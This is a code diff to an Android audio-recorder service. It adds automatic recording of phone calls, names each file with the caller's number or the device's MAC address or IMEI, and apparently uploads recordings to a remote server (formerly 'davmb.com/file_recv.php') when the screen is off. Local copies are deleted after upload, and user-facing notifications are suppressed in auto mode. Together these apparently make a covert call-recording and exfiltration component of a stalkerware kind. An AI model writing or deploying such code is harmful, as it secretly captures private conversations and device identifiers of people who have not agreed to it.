@@ -37,6 +37,8 @@ import android.media.MediaPlayer;
 import android.media.MediaPlayer.OnCompletionListener;
 import android.media.MediaRecorder;
 import android.media.MediaRecorder.OnErrorListener;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.HandlerThread;
@@ -54,6 +56,7 @@ import android.widget.RemoteViews;
 import com.android.audiorecorder.DebugConfig;
 import com.android.audiorecorder.R;
 import com.android.audiorecorder.RecorderFile;
+import com.android.audiorecorder.SettingsActivity;
 import com.android.audiorecorder.SoundRecorder;
 import com.android.audiorecorder.dao.FileManagerFactory;
 import com.android.audiorecorder.dao.IFileManager;
@@ -73,13 +76,12 @@ public class AudioService extends Service{
     private static final int UPLOAD_START = 2;
     private static final int UPLOAD_END = 4;
     
-    public static final int MODE_MANLY = 0;//no allowed time and tel to recorder
-    public static final int MODE_AUTO = 1;
+    public static final int LUNCH_MODE_MANLY = 0;//no allowed time and tel to recorder
+    public static final int LUNCH_MODE_AUTO = 1;
     private int mCurMode;
     
     public static final String Action_RecordListen = "com.audio.Action_BluetoothRecord";
-    public static final String key_upload_url = "key_upload_url";
-    public static final String default_url = "http://davmb.com/file_recv.php";
+
 
     /* action */
     public static final String Action_Record = "com.dahuatech.audio.Action_Record";
@@ -156,6 +158,7 @@ public class AudioService extends Service{
     private TelephonyManager telephonyManager;
     private PhoneStateListener phoneStateListener;
     private int mPhoneState;
+    private String mIncommingNumber;
     
     private TimeSchedule mTimeSchedule;
     //private RecorderUploader mUploader;
@@ -221,7 +224,7 @@ public class AudioService extends Service{
         mAlarmWakeLock = mPowerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AlarmWakeLock");
         mAudioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
         mNotificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-        mCurMode = MODE_MANLY;
+        mCurMode = LUNCH_MODE_MANLY;
         IntentFilter filter = new IntentFilter();
         filter.addAction(TimeSchedule.ACTION_TIMER_ALARM);
         filter.addAction(Intent.ACTION_USER_PRESENT);
@@ -252,9 +255,13 @@ public class AudioService extends Service{
                     if(state == TelephonyManager.CALL_STATE_IDLE && mPhoneState == TelephonyManager.CALL_STATE_OFFHOOK){
                         //stop recorder
                         Log.d(TAG, "---> stop recorder.");
+                        mIncommingNumber = "";
+                        callStopRecord();
                     }else if(state == TelephonyManager.CALL_STATE_OFFHOOK){
                         //start recorder
                         Log.d(TAG, "---> start recorder.");
+                        mIncommingNumber = incomingNumber;
+                        callStartRecord();
                     }
                     if(state == TelephonyManager.CALL_STATE_IDLE && mPhoneState != TelephonyManager.CALL_STATE_IDLE){
                         //mHandler.sendEmptyMessage(MSG_PROCESS_CALLLOG);//incomming or outcommint
@@ -272,7 +279,7 @@ public class AudioService extends Service{
         mUpHandlerThread = new HandlerThread("upload_thread", HandlerThread.MAX_PRIORITY);
         mUpHandlerThread.start();
         mUploadHandler = new Handler(mUpHandlerThread.getLooper(), mUploadHandlerCallback);
-        mCurMode = MODE_AUTO;
+        mCurMode = LUNCH_MODE_AUTO;
         Log.d(TAG, "===> onCreate.");
     }
 
@@ -308,7 +315,7 @@ public class AudioService extends Service{
             mHandler.sendEmptyMessage(MSG_START_RECORD);
             mHandler.removeCallbacks(mUpdateTimer);
             mHandler.post(mUpdateTimer);
-            mCurMode = MODE_MANLY;
+            mCurMode = LUNCH_MODE_MANLY;
         }
 
         @Override
@@ -560,10 +567,18 @@ public class AudioService extends Service{
                 fileManager.createDiretory(mRecoderPath+i);
             }
         }
+        String pre = "";
+        if(mPhoneState == TelephonyManager.CALL_STATE_OFFHOOK){
+            pre = mIncommingNumber+"_";
+        }else {
+            if(mCurMode == LUNCH_MODE_AUTO){
+                pre = getNamePrefix();
+            }
+        }
         if(mMimeType == SoundRecorder.FILE_TYPE_AMR){
-            mRecoderPath += File.separator + DateUtil.formatyyMMDDHHmmss(System.currentTimeMillis())+".mp3";
+            mRecoderPath += File.separator + pre + DateUtil.formatyyMMDDHHmmss(System.currentTimeMillis())+".mp3";
         } else {
-            mRecoderPath += File.separator +DateUtil.formatyyMMDDHHmmss(System.currentTimeMillis())+".mp3";
+            mRecoderPath += File.separator + pre + DateUtil.formatyyMMDDHHmmss(System.currentTimeMillis())+".3gp";
         }
         fileManager.createFile(mRecoderPath);
     }
@@ -601,7 +616,7 @@ public class AudioService extends Service{
     };
 
     private void notifyUpdate(int msg) {
-    	if(mCurMode == MODE_AUTO){
+    	if(mCurMode == LUNCH_MODE_AUTO){
     		return;
     	}
         for (IStateListener listener : mStateSet) {
@@ -648,20 +663,42 @@ public class AudioService extends Service{
         return timerInfo.toString();
     }
     
+    private void callStartRecord(){
+        if(!isValidRecorderTime()){
+            if(mCurMode == LUNCH_MODE_AUTO && mRecorderStart){
+                if(DebugConfig.DEBUG){
+                    Log.i(TAG, "---> call in come , start recorder");
+                }
+                mHandler.sendEmptyMessage(MSG_START_RECORD);
+            }
+        }
+    }
+    
+    private void callStopRecord(){
+        if(!isValidRecorderTime()){
+            if(mCurMode == LUNCH_MODE_AUTO && mRecorderStart){
+                if(DebugConfig.DEBUG){
+                    Log.i(TAG, "---> call over , stop recorder");
+                }
+                mHandler.sendEmptyMessage(MSG_STOP_RECORD);
+            }
+        }
+    }
+    
     private void processTimerAlarm(){
         acquireWakeLock();
         if(isValidRecorderTime()){//start
             if(DebugConfig.DEBUG){
                 Log.i(TAG, "processTimerAlarm mCurMode = " + mCurMode + " mRecorderStart = " + mRecorderStart);
             }
-            if(mCurMode == MODE_AUTO){
+            if(mCurMode == LUNCH_MODE_AUTO){
                 if(mRecorderStart){
                     mHandler.sendEmptyMessage(MSG_STOP_RECORD);
                 }
                 mHandler.sendEmptyMessage(MSG_START_RECORD);
             }
         } else {
-            if(mCurMode == MODE_AUTO && mRecorderStart){
+            if(mCurMode == LUNCH_MODE_AUTO && mRecorderStart){
                 mHandler.sendEmptyMessage(MSG_STOP_RECORD);
             }
             if(isValidUploadTime() && !mPowerManager.isScreenOn() && NetworkUtil.isWifiDataEnable(this)){//start
@@ -723,7 +760,7 @@ public class AudioService extends Service{
                         mTransferedBytes = transferedBytes;
                     }
                 });
-        if(uploadFile(mPreferences.getString(key_upload_url, default_url), progressHttpEntity) == UploadResult.SUCCESS){
+        if(uploadFile(mPreferences.getString(SettingsActivity.key_upload_url, SettingsActivity.value_default_url), progressHttpEntity) == UploadResult.SUCCESS){
             File f = new File(path);
             f.delete();
             fileManager.delete(id);
@@ -766,6 +803,29 @@ public class AudioService extends Service{
         }
         return mResult;
     }
+    
+    private String getNamePrefix(){
+        String mac = mPreferences.getString(SettingsActivity.KEY_MAC_ADDRESS, "");
+        if(mac == null || mac.length() == 0){
+            mac = getMacAddress(this);
+        }
+        if(mac == null || mac.length() == 0){
+            mac = telephonyManager.getDeviceId()+"_";
+        }
+        return mac;
+    }
+    
+    private String getMacAddress(Context context){
+        String macAddress = "";
+        WifiManager wifiMgr = (WifiManager)context.getSystemService(Context.WIFI_SERVICE);
+        WifiInfo info = (null == wifiMgr ? null : wifiMgr.getConnectionInfo());
+        if (null != info) {
+            macAddress = info.getMacAddress()+"_";
+            mPreferences.edit().putString(SettingsActivity.KEY_MAC_ADDRESS, macAddress).commit();
+        }
+        Log.d("TAG", "===> address = " + macAddress);
+        return macAddress;
+   }
     
     private class UploadHandlerCallback implements Handler.Callback{
         
